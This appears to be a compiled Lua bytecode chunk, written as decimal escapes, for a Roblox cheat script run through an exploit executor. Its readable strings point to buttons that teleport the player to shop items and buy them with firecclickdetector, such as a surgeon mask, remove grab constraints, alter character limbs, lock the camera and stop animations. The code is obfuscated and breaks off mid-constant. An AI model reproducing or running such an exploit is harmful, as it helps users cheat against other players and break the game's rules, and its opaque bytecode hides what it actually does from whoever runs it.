0\0\0\0\9\40\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\69\192\0\0\133\0\0\0\139\0\65\1\1\65\1\0\156\128\128\1\139\128\65\1\156\0\0\1\92\0\1\0\22\128\1\128\139\193\193\2\1\2\2\0\156\129\128\1\154\1\0\0\22\64\0\128\139\65\194\2\156\65\0\1\97\128\0\0\22\128\253\127\69\128\2\0\70\192\194\0\129\0\2\0\92\128\0\1\133\0\0\0\139\0\65\1\1\65\1\0\156\128\128\1\73\128\0\134\73\0\194\134\73\192\67\135\134\64\68\0\139\128\68\1\1\193\4\0\156\128\128\1\73\128\0\136\73\64\69\138\73\192\69\139\30\0\128\0\24\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\6\0\0\0\112\97\105\114\115\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\12\0\0\0\71\101\116\67\104\105\108\100\114\101\110\0\4\4\0\0\0\73\115\65\0\4\7\0\0\0\67\97\109\101\114\97\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\7\0\0\0\80\97\114\101\110\116\0\4\5\0\0\0\78\97\109\101\0\4\11\0\0\0\67\97\109\101\114\97\84\121\112\101\0\4\7\0\0\0\67\117\115\116\111\109\0\4\14\0\0\0\67\97\109\101\114\97\83\117\98\106\101\99\116\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\23\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\87\104\105\99\104\73\115\65\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\11\0\0\0\72\101\97\100\76\111\99\107\101\100\0\1\1\4\10\0\0\0\72\101\97\100\83\99\97\108\101\0\3\0\0\0\0\0\0\240\63\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\11\7\0\0\80\7\0\0\1\0\0\6\13\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\131\0\0\1\198\0\193\0\203\64\193\1\100\1\0\0\0\0\0\1\220\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\17\7\0\0\79\7\0\0\1\0\0\2\19\0\0\0\5\0\0\0\100\0\0\0\4\0\0\0\28\64\0\1\5\64\0\0\65\128\0\0\28\64\0\1\5\0\0\0\100\64\0\0\4\0\0\0\28\64\0\1\5\64\0\0\65\128\0\0\28\64\0\1\5\0\0\0\100\128\0\0\4\0\0\0\28\64\0\1\30\0\128\0\3\0\0\0\4\6\0\0\0\112\99\97\108\108\0\4\5\0\0\0\119\97\105\116\0\3\154\153\153\153\153\153\185\63\3\0\0\0\0\0\0\0\19\7\0\0\37\7\0\0\1\0\0\5\66\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\11\64\65\0\28\64\0\1\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\128\65\0\11\64\65\0\28\64\0\1\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\192\65\0\69\64\2\0\70\128\194\0\9\64\0\132\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\192\65\0\69\64\2\0\70\128\194\0\9\64\128\133\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\128\65\0\69\64\3\0\70\128\195\0\129\192\3\0\193\192\3\0\1\193\3\0\92\128\0\2\9\64\0\134\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\128\65\0\9\64\68\136\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\128\65\0\9\192\68\137\2\0\128\0\8\0\0\0\4\0\0\0\23\64\68\0\22\64\1\128\5\0\5\0\100\0\0\0\28\64\0\1\5\64\5\0\28\64\128\0\22\128\253\127\30\0\128\0\22\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\6\0\0\0\83\104\105\114\116\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\14\0\0\0\82\105\103\104\116\85\112\112\101\114\76\101\103\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\22\0\0\0\72\101\97\108\116\104\68\105\115\112\108\97\121\68\105\115\116\97\110\99\101\0\4\5\0\0\0\109\97\116\104\0\4\5\0\0\0\104\117\103\101\0\4\20\0\0\0\78\97\109\101\68\105\115\112\108\97\121\68\105\115\116\97\110\99\101\0\4\5\0\0\0\83\105\122\101\0\4\8\0\0\0\86\101\99\116\111\114\51\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\0\0\4\9\0\0\0\77\97\115\115\108\101\115\115\0\1\1\4\11\0\0\0\67\97\110\67\111\108\108\105\100\101\0\1\0\4\6\0\0\0\112\99\97\108\108\0\4\5\0\0\0\119\97\105\116\0\1\0\0\0\0\0\0\0\31\7\0\0\34\7\0\0\0\0\0\5\26\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\69\128\1\0\70\192\193\0\129\0\2\0\193\64\2\0\1\1\2\0\92\128\0\2\9\64\0\131\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\69\128\1\0\70\192\193\0\129\0\2\0\193\64\2\0\1\1\2\0\92\128\0\2\9\64\0\131\30\0\128\0\10\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\14\0\0\0\82\105\103\104\116\85\112\112\101\114\76\101\103\0\4\22\0\0\0\82\105\103\104\116\72\105\112\82\105\103\65\116\116\97\99\104\109\101\110\116\0\4\7\0\0\0\67\70\114\97\109\101\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\0\0\3\0\0\0\148\7\106\248\64\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\39\7\0\0\57\7\0\0\1\0\0\5\66\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\11\64\65\0\28\64\0\1\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\128\65\0\11\64\65\0\28\64\0\1\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\192\65\0\69\64\2\0\70\128\194\0\9\64\0\132\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\192\65\0\69\64\2\0\70\128\194\0\9\64\128\133\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\69\64\3\0\70\128\195\0\129\192\3\0\193\192\3\0\1\193\3\0\92\128\0\2\9\64\0\134\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\9\64\68\136\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\9\192\68\137\2\0\128\0\8\0\0\0\4\0\0\0\23\64\68\0\22\64\1\128\5\0\5\0\100\0\0\0\28\64\0\1\5\64\5\0\28\64\128\0\22\128\253\127\30\0\128\0\22\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\13\0\0\0\76\101\102\116\85\112\112\101\114\76\101\103\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\6\0\0\0\80\97\110\116\115\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\22\0\0\0\72\101\97\108\116\104\68\105\115\112\108\97\121\68\105\115\116\97\110\99\101\0\4\5\0\0\0\109\97\116\104\0\4\5\0\0\0\104\117\103\101\0\4\20\0\0\0\78\97\109\101\68\105\115\112\108\97\121\68\105\115\116\97\110\99\101\0\4\5\0\0\0\83\105\122\101\0\4\8\0\0\0\86\101\99\116\111\114\51\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\0\0\4\9\0\0\0\77\97\115\115\108\101\115\115\0\1\1\4\11\0\0\0\67\97\110\67\111\108\108\105\100\101\0\1\0\4\6\0\0\0\112\99\97\108\108\0\4\5\0\0\0\119\97\105\116\0\1\0\0\0\0\0\0\0\51\7\0\0\54\7\0\0\0\0\0\5\26\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\69\128\1\0\70\192\193\0\129\0\2\0\193\64\2\0\1\1\2\0\92\128\0\2\9\64\0\131\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\69\128\1\0\70\192\193\0\129\0\2\0\193\64\2\0\1\1\2\0\92\128\0\2\9\64\0\131\30\0\128\0\10\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\13\0\0\0\76\101\102\116\85\112\112\101\114\76\101\103\0\4\21\0\0\0\76\101\102\116\72\105\112\82\105\103\65\116\116\97\99\104\109\101\110\116\0\4\7\0\0\0\67\70\114\97\109\101\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\0\0\3\0\0\0\148\7\106\248\64\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\59\7\0\0\78\7\0\0\1\0\0\5\68\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\11\128\65\0\28\64\0\1\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\192\65\0\6\0\66\0\11\128\65\0\28\64\0\1\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\64\66\0\69\192\2\0\70\0\195\0\9\64\0\133\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\64\66\0\69\192\2\0\70\0\195\0\9\64\128\134\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\69\192\3\0\70\0\196\0\129\64\4\0\193\64\4\0\1\65\4\0\92\128\0\2\9\64\0\135\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\9\192\68\137\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\9\64\69\138\2\0\128\0\8\0\0\0\4\0\0\0\23\192\68\0\22\64\1\128\5\128\5\0\100\0\0\0\28\64\0\1\5\192\5\0\28\64\128\0\22\128\253\127\30\0\128\0\24\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\5\0\0\0\72\101\97\100\0\4\5\0\0\0\78\101\99\107\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\11\0\0\0\85\112\112\101\114\84\111\114\115\111\0\4\15\0\0\0\78\101\99\107\65\116\116\97\99\104\109\101\110\116\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\22\0\0\0\72\101\97\108\116\104\68\105\115\112\108\97\121\68\105\115\116\97\110\99\101\0\4\5\0\0\0\109\97\116\104\0\4\5\0\0\0\104\117\103\101\0\4\20\0\0\0\78\97\109\101\68\105\115\112\108\97\121\68\105\115\116\97\110\99\101\0\4\5\0\0\0\83\105\122\101\0\4\8\0\0\0\86\101\99\116\111\114\51\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\0\0\4\9\0\0\0\77\97\115\115\108\101\115\115\0\1\1\4\11\0\0\0\67\97\110\67\111\108\108\105\100\101\0\1\0\4\6\0\0\0\112\99\97\108\108\0\4\5\0\0\0\119\97\105\116\0\1\0\0\0\0\0\0\0\71\7\0\0\75\7\0\0\0\0\0\5\39\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\69\128\1\0\70\192\193\0\129\0\2\0\193\64\2\0\1\1\2\0\92\128\0\2\9\64\0\131\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\128\66\0\6\64\65\0\69\128\1\0\70\192\193\0\129\0\2\0\193\64\2\0\1\1\2\0\92\128\0\2\9\64\0\131\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\69\128\1\0\70\192\193\0\129\0\2\0\193\64\2\0\1\1\2\0\92\128\0\2\9\64\0\131\30\0\128\0\11\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\5\0\0\0\72\101\97\100\0\4\18\0\0\0\78\101\99\107\82\105\103\65\116\116\97\99\104\109\101\110\116\0\4\7\0\0\0\67\70\114\97\109\101\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\0\0\3\0\0\0\148\7\106\248\64\4\11\0\0\0\85\112\112\101\114\84\111\114\115\111\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\82\7\0\0\106\7\0\0\1\0\0\6\16\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\133\0\1\0\134\64\65\1\134\128\65\1\198\192\193\0\203\0\194\1\100\1\0\0\0\0\128\0\0\0\0\1\220\64\128\1\30\0\128\0\9\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\88\7\0\0\105\7\0\0\2\0\0\5\27\0\0\0\4\0\0\0\6\0\64\0\23\64\64\0\22\0\3\128\4\0\0\0\9\128\64\128\5\192\0\0\11\0\65\0\129\64\1\0\28\128\128\1\11\128\65\0\129\192\1\0\193\0\2\0\36\1\0\0\4\0\128\0\28\64\128\2\22\0\2\128\4\0\0\0\9\64\64\128\5\192\0\0\11\0\65\0\129\64\1\0\28\128\128\1\11\64\66\0\129\192\1\0\28\64\128\1\30\0\128\0\10\0\0\0\4\5\0\0\0\84\101\120\116\0\4\10\0\0\0\83\116\111\112\32\65\110\105\109\0\4\10\0\0\0\80\108\97\121\32\65\110\105\109\0\4\5\0\0\0\103\97\109\101\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\11\0\0\0\82\117\110\83\101\114\118\105\99\101\0\4\17\0\0\0\66\105\110\100\84\111\82\101\110\100\101\114\83\116\101\112\0\4\10\0\0\0\83\116\111\112\45\65\110\105\109\0\3\0\0\0\0\0\0\0\0\4\21\0\0\0\85\110\98\105\110\100\70\114\111\109\82\101\110\100\101\114\83\116\101\112\0\1\0\0\0\0\0\0\0\91\7\0\0\99\7\0\0\1\0\0\7\35\0\0\0\5\0\0\0\28\64\128\0\5\64\0\0\68\0\0\0\70\128\192\0\75\192\192\0\193\0\1\0\92\128\128\1\75\64\193\0\92\0\0\1\28\0\1\0\22\192\4\128\70\129\65\2\87\192\193\2\22\128\3\128\65\1\2\0\90\65\0\0\22\192\2\128\65\65\2\0\90\65\0\0\22\0\2\128\65\129\2\0\90\65\0\0\22\64\1\128\65\193\2\0\90\65\0\0\22\128\0\128\65\1\3\0\90\65\0\0\22\192\255\127\75\129\67\2\92\65\0\1\33\128\0\0\22\64\250\127\30\0\128\0\15\0\0\0\4\5\0\0\0\119\97\105\116\0\4\6\0\0\0\112\97\105\114\115\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\23\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\87\104\105\99\104\73\115\65\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\26\0\0\0\71\101\116\80\108\97\121\105\110\103\65\110\105\109\97\116\105\111\110\84\114\97\99\107\115\0\4\5\0\0\0\78\97\109\101\0\4\6\0\0\0\66\108\111\99\107\0\4\11\0\0\0\65\110\105\109\97\116\105\111\110\49\0\4\11\0\0\0\65\110\105\109\97\116\105\111\110\50\0\4\10\0\0\0\65\110\105\109\97\116\105\111\110\0\4\9\0\0\0\87\97\108\107\65\110\105\109\0\4\8\0\0\0\82\117\110\65\110\105\109\0\4\6\0\0\0\83\116\111\109\112\0\4\5\0\0\0\83\116\111\112\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\108\7\0\0\128\7\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\113\7\0\0\127\7\0\0\0\0\0\8\90\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\69\0\0\0\70\128\193\0\70\192\193\0\70\0\194\0\70\64\194\0\133\0\0\0\134\64\64\1\134\128\64\1\134\192\64\1\134\0\65\1\198\192\194\0\198\128\194\1\5\1\3\0\6\65\67\2\65\129\3\0\129\193\3\0\193\129\3\0\28\129\0\2\204\0\129\1\137\192\0\133\133\0\0\0\134\64\64\1\134\128\64\1\134\192\64\1\134\0\65\1\134\64\65\1\198\192\194\0\198\64\193\1\141\192\0\1\134\0\68\1\25\64\68\1\22\128\12\128\133\128\4\0\193\192\4\0\156\64\0\1\133\0\5\0\203\64\197\0\65\129\5\0\220\128\128\1\1\193\5\0\156\64\128\1\133\0\0\0\134\64\64\1\134\128\64\1\134\64\70\1\139\128\70\1\1\193\6\0\156\128\128\1\135\0\6\0\133\0\6\0\197\0\0\0\198\64\192\1\198\128\192\1\198\192\192\1\137\192\0\142\133\128\4\0\156\64\128\0\133\0\0\0\134\64\64\1\134\128\64\1\134\192\64\1\139\128\70\1\1\193\6\0\156\64\128\1\133\0\0\0\139\64\71\1\1\129\7\0\156\128\128\1\139\192\71\1\5\1\8\0\6\65\67\2\28\1\128\0\156\64\0\0\133\0\0\0\134\64\64\1\134\128\64\1\134\192\64\1\134\0\65\1\197\128\2\0\198\64\195\1\0\1\0\0\220\128\0\1\137\192\0\133\30\0\128\0\33\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\8\0\0\0\73\103\110\111\114\101\100\0\4\5\0\0\0\83\104\111\112\0\4\21\0\0\0\91\83\117\114\103\101\111\110\32\77\97\115\107\93\32\45\32\36\50\53\0\4\7\0\0\0\67\70\114\97\109\101\0\4\5\0\0\0\72\101\97\100\0\4\8\0\0\0\86\101\99\116\111\114\51\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\0\8\64\4\10\0\0\0\77\97\103\110\105\116\117\100\101\0\3\0\0\0\0\0\0\73\64\4\5\0\0\0\119\97\105\116\0\3\154\153\153\153\153\153\201\63\4\18\0\0\0\102\105\114\101\99\108\105\99\107\100\101\116\101\99\116\111\114\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\14\0\0\0\67\108\105\99\107\68\101\116\101\99\116\111\114\0\3\0\0\0\0\0\0\16\64\4\6\0\0\0\116\111\111\108\102\0\4\9\0\0\0\66\97\99\107\112\97\99\107\0\4\13\0\0\0\87\97\105\116\70\111\114\67\104\105\108\100\0\4\5\0\0\0\77\97\115\107\0\4\7\0\0\0\80\97\114\101\110\116\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\12\0\0\0\86\105\114\116\117\97\108\85\115\101\114\0\4\13\0\0\0\67\108\105\99\107\66\117\116\116\111\110\49\0\4\8\0\0\0\86\101\99\116\111\114\50\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\130\7\0\0\152\7\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\135\7\0\0\151\7\0\0\0\0\0\8\105\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\6\192\64\0\6\0\65\0\6\64\65\0\69\0\0\0\70\128\193\0\70\192\193\0\70\0\194\0\70\64\194\0\133\0\0\0\134\64\64\1\134\128\64\1\134\192\64\1\134\0\65\1\198\192\194\0\198\128\194\1\5\1\3\0\6\65\67\2\65\129\3\0\129\193\3\0\193\129\3\0\28\129\0\2\204\0\129\1\137\192\0\133\133\0\0\0\134\64\64\1\134\128\64\1\134\192\64\1\134\0\65\1\134\64\65\1\198\192\194\0\198\64\193\1\141\192\0\1\134\0\68\1\25\64\68\1\22\64\16\128\133\128\4\0\193\192\4\0\156\64\0\1\133\0\5\0\203\64\197\0\65\129\5\0\220\128\128\1\1\193\5\0\156\64\128\1\133\0\0\0\134\64\64\1\134\128\64\1\134\64\70\1\139\128\70\1\1\193\6\0\156\128\128\1\135\0\6\0\133\0\6\0\197\0\0\0\198\64\192\1\198\128\192\1\198\192\192\1\137\192\0\142\133\128\4\0\156\64\128\0\133\0\0\0\134\64\64\1\134\128\64\1\134\192\64\1\139\128\70\1\1\193\6\0\156\64\128\1\133\0\0\0\139\64\71\1\1\129\7\0\156\128\128\1\139\192\71\1\5\1\8\0\6\65\67\2\28\1\128\0\156\64\0\0\133\0\0\0\134\64\64\1\134\128\64\1\134\192\64\1\139\128\70\1\1\65\8\0\156\64\128\1\133\0\0\0\134\64\64\1\134\128\64\1\134\192\64\1\134\64\72\1\134\128\72\1\139\192\72\1\156\64\0\1\133\0\0\0\134\64\64\1\134\128\64\1\134\192\64\1\134\0\65\1\197\128\2\0\198\64\195\1\0\1\0\0\220\128\0\1\137\192\0\133\30\0\128\0\36\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\17\0\0\0\72\117\109\97\110\111\105\100\82\111\111\116\80\97\114\116\0\4\9\0\0\0\80\111\115\105\116\105\111\110\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\8\0\0\0\73\103\110\111\114\101\100\0\4\5\0\0\0\83\104\111\112\0\4\21\0\0\0\91\83\117\114\103\101\111\110\32\77\97\115\107\93\32\45\32\36\50\53\0\4\7\0\0\0\67\70\114\97\109\101\0\4\5\0\0\0\72\101\97\100\0\4\8\0\0\0\86\101\99\116\111\114\51\0\4\4\0\0\0\110\101\119\0\3\0\0\0\0\0\0\0\0\3\0\0\0\0\0\0\8\64\4\10\0\0\0\77\97\103\110\105\116\117\100\101\0\3\0\0\0\0\0\0\73\64\4\5\0\0\0\119\97\105\116\0\3\154\153\153\153\153\153\201\63\4\18\0\0\0\102\105\114\101\99\108\105\99\107\100\101\116\101\99\116\111\114\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\14\0\0\0\67\108\105\99\107\68\101\116\101\99\116\111\114\0\3\0\0\0\0\0\0\16\64\4\6\0\0\0\116\111\111\108\102\0\4\9\0\0\0\66\97\99\107\112\97\99\107\0\4\13\0\0\0\87\97\105\116\70\111\114\67\104\105\108\100\0\4\5\0\0\0\77\97\115\107\0\4\7\0\0\0\80\97\114\101\110\116\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\12\0\0\0\86\105\114\116\117\97\108\85\115\101\114\0\4\13\0\0\0\67\108\105\99\107\66\117\116\116\111\110\49\0\4\8\0\0\0\86\101\99\116\111\114\50\0\4\12\0\0\0\73\110\45\103\97\109\101\77\97\115\107\0\4\7\0\0\0\72\97\110\100\108\101\0\4\8\0\0\0\68\101\115\116\114\111\121\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\154\7\0\0\170\7\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\159\7\0\0\169\7\0\0\0\0\0\5\36\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\69\0\0\0\75\192\192\0\193\0\1\0\92\128\128\1\70\64\192\0\75\64\193\0\198\128\65\0\92\128\128\1\75\192\193\0\193\0\2\0\92\128\128\1\90\0\0\0\22\128\4\128\139\64\194\0\156\64\0\1\133\128\2\0\193\192\2\0\156\64\0\1\134\0\67\0\134\64\67\1\137\192\67\135\133\128\2\0\193\192\2\0\156\64\0\1\133\0\0\0\134\64\64\1\134\128\64\1\134\0\68\1\134\64\67\1\139\64\68\1\1\129\4\0\156\64\128\1\30\0\128\0\19\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\101\114\0\4\11\0\0\0\71\101\116\83\101\114\118\105\99\101\0\4\10\0\0\0\87\111\114\107\115\112\97\99\101\0\4\13\0\0\0\87\97\105\116\70\111\114\67\104\105\108\100\0\4\5\0\0\0\78\97\109\101\0\4\15\0\0\0\70\105\110\100\70\105\114\115\116\67\104\105\108\100\0\4\20\0\0\0\71\82\65\66\66\73\78\71\95\67\79\78\83\84\82\65\73\78\84\0\4\8\0\0\0\68\101\115\116\114\111\121\0\4\5\0\0\0\119\97\105\116\0\3\123\20\174\71\225\122\164\63\4\10\0\0\0\99\104\97\114\97\99\116\101\114\0\4\9\0\0\0\72\117\109\97\110\111\105\100\0\4\4\0\0\0\83\105\116\0\1\1\4\10\0\0\0\67\104\97\114\97\99\116\101\114\0\4\12\0\0\0\67\104\97\110\103\101\83\116\97\116\101\0\3\0\0\0\0\0\0\8\64\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\172\7\0\0\180\7\0\0\1\0\0\5\11\0\0\0\5\0\0\0\6\64\64\0\65\128\0\0\132\0\0\0\28\128\128\1\70\192\64\0\134\0\193\0\139\64\65\1\36\1\0\0\156\64\128\1\30\0\128\0\6\0\0\0\4\9\0\0\0\73\110\115\116\97\110\99\101\0\4\4\0\0\0\110\101\119\0\4\12\0\0\0\76\111\99\97\108\83\99\114\105\112\116\0\4\7\0\0\0\80\97\114\101\110\116\0\4\18\0\0\0\77\111\117\115\101\66\117\116\116\111\110\49\67\108\105\99\107\0\4\8\0\0\0\67\111\110\110\101\99\116\0\1\0\0\0\0\0\0\0\177\7\0\0\179\7\0\0\0\0\0\2\5\0\0\0\5\0\0\0\6\64\64\0\6\128\64\0\9\0\193\129\30\0\128\0\5\0\0\0\4\5\0\0\0\103\97\109\101\0\4\8\0\0\0\80\108\97\121\101\114\115\0\4\12\0\0\0\76\111\99\97\108\80\108\97\121\